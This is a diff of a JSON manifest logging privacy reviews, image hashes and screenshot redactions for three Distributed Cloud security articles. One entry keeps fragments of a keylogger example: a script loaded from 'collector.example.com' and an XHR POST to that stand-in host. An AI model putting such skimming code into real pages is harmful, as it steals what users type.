@@ -15671,5 +15671,389 @@
         "output_sha256": "fac43d79dc1f6dc7e0a8e8126d07045b44218b60d3147b9e09abbb934a0dc0b4"
       }
     }
+  },
+  "69896": {
+    "article_hash": "60e6fdb097945e8de16a6287b8634aa77c2b002ee2b11bf71de09a016ac641e0",
+    "decision": "include",
+    "reason": "Distributed Cloud focused deployment or security guidance",
+    "privacy": "approved",
+    "privacy_reason": "Complete first-post prose and three images individually reviewed. Demo app URL, collector and script hosts replaced with reserved domains; mail sender/recipient identity removed or normalized. Browser forms contain no entered credentials; JavaScript keylogger example retains event and POST logic with no actual captured values. Waterfall diagram contains intentionally blurred first-party labels and public third-party analytics script names without query payload or user data. Alert reason and action preserved; metadata stripped.",
+    "assets": {
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/8/8c7ce7d56f6a38045e8b4f6afd04c8074dec9105.jpeg": "a1755f5e3f528f8f47e73dc00fc14f3c9d4b73a8d2c00a9d4d69fdf7002f29dd",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/e/e64bebcdad3d74049d957264fd9fc2e3879bdfd9.jpeg": "17af4e1641de615d8896bd36b8d595dd283aa123cc6ba217609877890dd272db",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/1/a/1a19861ab079a3acf0572dee58159b6b45d390b1.jpeg": "873f7487d8a5fb5eb5155d161c4548f3529cb415b4beeade1be3d90c3b487ce5"
+    },
+    "asset_redactions": {
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/8/8c7ce7d56f6a38045e8b4f6afd04c8074dec9105.jpeg": {
+        "rectangles": [
+          [
+            1337,
+            46,
+            1396,
+            70
+          ],
+          [
+            1327,
+            0,
+            1366,
+            17
+          ]
+        ],
+        "labels": [
+          {
+            "rectangle": [
+              130,
+              46,
+              493,
+              68
+            ],
+            "text": "https://app.example.com/user/signin",
+            "size": 12
+          },
+          {
+            "rectangle": [
+              924,
+              15,
+              1407,
+              33
+            ],
+            "text": "DevTools - https://app.example.com/user/signin",
+            "size": 11
+          },
+          {
+            "rectangle": [
+              699,
+              149,
+              779,
+              177
+            ],
+            "text": "app.example",
+            "size": 9
+          },
+          {
+            "rectangle": [
+              978,
+              176,
+              1240,
+              194
+            ],
+            "text": "https://scripts.example.com/",
+            "size": 12
+          },
+          {
+            "rectangle": [
+              880,
+              194,
+              1240,
+              213
+            ],
+            "text": "src=\"http://collector.example.com:8080/js\"",
+            "size": 11
+          },
+          {
+            "rectangle": [
+              838,
+              395,
+              1240,
+              412
+            ],
+            "text": "xhr.open('POST', 'https://collector.example.com');",
+            "size": 11
+          },
+          {
+            "rectangle": [
+              855,
+              566,
+              1240,
+              584
+            ],
+            "text": "xhr.open('POST', 'https://collector.example.com');",
+            "size": 11
+          }
+        ],
+        "output_sha256": "dbd84969d61704699e7ed019b8059447857a02293e6f24787d9e0361b8c96622"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/1/a/1a19861ab079a3acf0572dee58159b6b45d390b1.jpeg": {
+        "rectangles": [
+          [
+            16,
+            77,
+            128,
+            110
+          ]
+        ],
+        "labels": [
+          {
+            "rectangle": [
+              50,
+              79,
+              321,
+              99
+            ],
+            "text": "no-reply@example.com",
+            "size": 11
+          },
+          {
+            "rectangle": [
+              501,
+              358,
+              797,
+              411
+            ],
+            "text": "on page https://app.example.com/user/signin.",
+            "size": 9
+          },
+          {
+            "rectangle": [
+              504,
+              375,
+              795,
+              391
+            ],
+            "text": "Risk reason: shorter Whois info, website is",
+            "size": 9
+          },
+          {
+            "rectangle": [
+              504,
+              389,
+              795,
+              403
+            ],
+            "text": "unpopular, young domain age. Category is Unknown.",
+            "size": 9
+          }
+        ],
+        "output_sha256": "a5290b89b80fd0ef4bbef240b53572e11dbcdd474a3714062bc24cd69e6fcde1"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/e/e64bebcdad3d74049d957264fd9fc2e3879bdfd9.jpeg": {
+        "strip_metadata": true,
+        "rectangles": [],
+        "output_sha256": "24a8dd6c0e8fa0a4ecca6d8b8c569e0e8bd6f121308ba18bf7cdfb44e0d5bd1f"
+      }
+    }
+  },
+  "70124": {
+    "article_hash": "dc47fe6dde4cc30c721298b36206e5f2255c9a5c4fffbb60210c1bf6564470a1",
+    "decision": "include",
+    "reason": "Distributed Cloud focused deployment or security guidance",
+    "privacy": "approved",
+    "privacy_reason": "Complete first-post prose and all five images individually reviewed. Exposed client secret and cloud secret replaced with explicit synthetic placeholders; access IDs, user ARN, account ID and sign-in alias removed; IAM personal user normalized to service user. UI fields, permission guidance and credential creation/blindfold workflow preserved. No original secret remains in reviewed pixels or public policy; metadata stripped.",
+    "assets": {
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/4/49d1b593c5069a6dcd71987a2c65cb8bdf74fe54.png": "a2e1761421df1487153b85891722a9e14ba253515e84b8a4462a259ee9783801",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/8/81a418db963ee5bc42996bc40f83d0322722fe3b.png": "d330a0a8861c49ab80e07d7567060ebcc5b1fa46f0156ca70ae209cb576ceb06",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/8/875427fbaf7ada9b36b9145d0f2e9b852ae09edd.png": "7afeecd22a818a7c60f1618013b905abd123e3b2e5bbff6a28b4bfe2798c880e",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/f/f24f1e98ce6800a9eac0461da586b1964e11907e.png": "6d1ef41c1e724dbfc02711aa0c44ba5e391ee33ae6fd0d36ccc0da9ac96aa632",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/a/3/a32c2c7b90962de2b516928ec0d732632040a27a.png": "b9ab30e8f0202c94c53032ee7f18c9fa0e383dfb710a9d4578bb7517b641bc84"
+    },
+    "asset_redactions": {
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/8/81a418db963ee5bc42996bc40f83d0322722fe3b.png": {
+        "labels": [
+          {
+            "rectangle": [
+              434,
+              169,
+              978,
+              202
+            ],
+            "text": "[example client secret]    example-secret-id",
+            "size": 14
+          }
+        ],
+        "output_sha256": "74bffbd7decc46ecbf465b24f47b77f80ff170680173f520cf6c320f5cbe114a"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/8/875427fbaf7ada9b36b9145d0f2e9b852ae09edd.png": {
+        "labels": [
+          {
+            "rectangle": [
+              235,
+              164,
+              279,
+              187
+            ],
+            "text": "svc-xc",
+            "size": 10
+          }
+        ],
+        "output_sha256": "e5d69aa5a20b09e07732b7b128ffd8d7261097b7b7bead8e63bfdd0289fcb5ea"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/f/f24f1e98ce6800a9eac0461da586b1964e11907e.png": {
+        "rectangles": [
+          [
+            215,
+            26,
+            253,
+            48
+          ],
+          [
+            419,
+            96,
+            528,
+            117
+          ],
+          [
+            540,
+            215,
+            610,
+            231
+          ],
+          [
+            186,
+            436,
+            308,
+            458
+          ],
+          [
+            13,
+            458,
+            96,
+            463
+          ]
+        ],
+        "labels": [],
+        "output_sha256": "604dbf963cea37d4b1dae418dd397ea051d3c89d6dbd572fb75cf369010dd478"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/a/3/a32c2c7b90962de2b516928ec0d732632040a27a.png": {
+        "labels": [
+          {
+            "rectangle": [
+              56,
+              160,
+              277,
+              183
+            ],
+            "text": "[example cloud secret]",
+            "size": 12
+          }
+        ],
+        "output_sha256": "01ed3ca4b51d8ca51a359cc4acd402006bf63e4414ff148ea905905e4f7f397d"
+      }
+    }
+  },
+  "73450": {
+    "article_hash": "bfd443d5578f420060b10db4932062f22b157f5c8deea45e1f6c7e6f6b5aafa7",
+    "decision": "include",
+    "reason": "Distributed Cloud focused deployment or security guidance",
+    "privacy": "approved",
+    "privacy_reason": "Complete first-post prose and five images individually reviewed. Browser CSRF and request fingerprint values replaced with explicit examples; identifying object names and domains normalized while retaining complete JSON syntax, query fields and request structure. Python/Ansible snippets contain only prompted or templated token variables and placeholders; all code preserved. No secret or customer payload remains; metadata stripped.",
+    "assets": {
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/c/cf451ac4d6026ada4f5fd6c20ad484ba4b5b0f65.png": "b473e81c40b6f7510e2403856335d6275bfc85e264aabd9c736c6705c3ffe716",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/2X/f/f3bfdd2d7aa02c614639049628582bbfe1ad1f20.png": "56048042d10c53be33a65d3f117d7b809f893b47ad8b81d4e027322828a245f7",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/2/0/201c5a4873b6be0c1d07bd6596e93ce4f9ace788.png": "00c2b2fbd5130ee5bd49019b5f008b7990d577bce47b7491ea4c1527d085c6be",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/a/4/a481dd5743cc5930f3eb3f563e573adb9ac0f2a3.png": "d6b923f8fb48379552f17378ae6f9ebd3c572b82e041d111e0d988c13bfcaaf2",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/d/6/d65eea378c21b48b78f18e28b7590ebb3a4cb983.png": "59b39cabe3cc00e2464315fe54287ae70cccc058d06fb8286ea60591379d8ca8"
+    },
+    "asset_redactions": {
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/2/0/201c5a4873b6be0c1d07bd6596e93ce4f9ace788.png": {
+        "labels": [
+          {
+            "rectangle": [
+              121,
+              125,
+              275,
+              143
+            ],
+            "text": "\"name\": \"example-http\",",
+            "size": 10
+          },
+          {
+            "rectangle": [
+              163,
+              177,
+              356,
+              197
+            ],
+            "text": "\"ves.io/app_type\": \"example-http\"",
+            "size": 10
+          },
+          {
+            "rectangle": [
+              132,
+              302,
+              302,
+              324
+            ],
+            "text": "\"app.example.com\"",
+            "size": 11
+          }
+        ],
+        "output_sha256": "bc3060e3b76f80fce6cfa917d1d63431729151cf95767c493d0ddf0ffbab7510"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/d/6/d65eea378c21b48b78f18e28b7590ebb3a4cb983.png": {
+        "labels": [
+          {
+            "rectangle": [
+              425,
+              322,
+              1443,
+              345
+            ],
+            "text": "[example-csrf-token]",
+            "size": 14
+          },
+          {
+            "rectangle": [
+              425,
+              349,
+              1143,
+              372
+            ],
+            "text": "[example-request-fingerprint]",
+            "size": 14
+          },
+          {
+            "rectangle": [
+              210,
+              465,
+              354,
+              488
+            ],
+            "text": "example-token",
+            "size": 11
+          },
+          {
+            "rectangle": [
+              41,
+              516,
+              354,
+              540
+            ],
+            "text": "http_loadbalancers?csrf=example-token",
+            "size": 11
+          },
+          {
+            "rectangle": [
+              395,
+              414,
+              1410,
+              436
+            ],
+            "text": "{namespace: \"default\", metadata: {name: \"example-lb\", disable: false}, spec: {domains: [\"app.example.com\"], ...}}",
+            "size": 12
+          },
+          {
+            "rectangle": [
+              491,
+              439,
+              624,
+              460
+            ],
+            "text": "{name: \"example-lb\",",
+            "size": 12
+          },
+          {
+            "rectangle": [
+              462,
+              477,
+              697,
+              500
+            ],
+            "text": "{domains: [\"app.example.com\"], ...}",
+            "size": 12
+          }
+        ],
+        "output_sha256": "80ffa6cecc2dc8c3210d109a19ed051f820748d38c7c9e2e2ea4460d35f8f3ea"
+      }
+    }
   }
 }
